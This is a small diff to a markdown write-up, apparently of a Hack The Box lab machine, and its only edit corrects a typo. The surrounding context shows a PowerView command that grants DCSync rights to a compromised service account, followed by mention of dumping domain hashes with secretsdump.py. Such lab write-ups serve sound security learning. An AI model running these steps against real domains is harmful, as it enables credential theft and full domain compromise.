@@ -282,7 +282,7 @@ $Cred = New-Object System.Management.Automation.PSCredential('HTB.local\svc-alfr
 Add-DomainObjectAcl -TargetIdentity "dc=htb,dc=local" -PrincipalIdentity 'HTB.local\svc-alfresco' -Rights DCSync -Credential $Cred -Verbose
 ```
 
-This takes a little while to run but we eventually have permission to dump hashes. We use impackets `secretsdump.py` and voala! :D
+This takes a little while to run but we eventually have permission to dump hashes. We use impacket's `secretsdump.py` and voala! :D
 
 ![hashes_dumped](hashes_dumped.jpg)
 
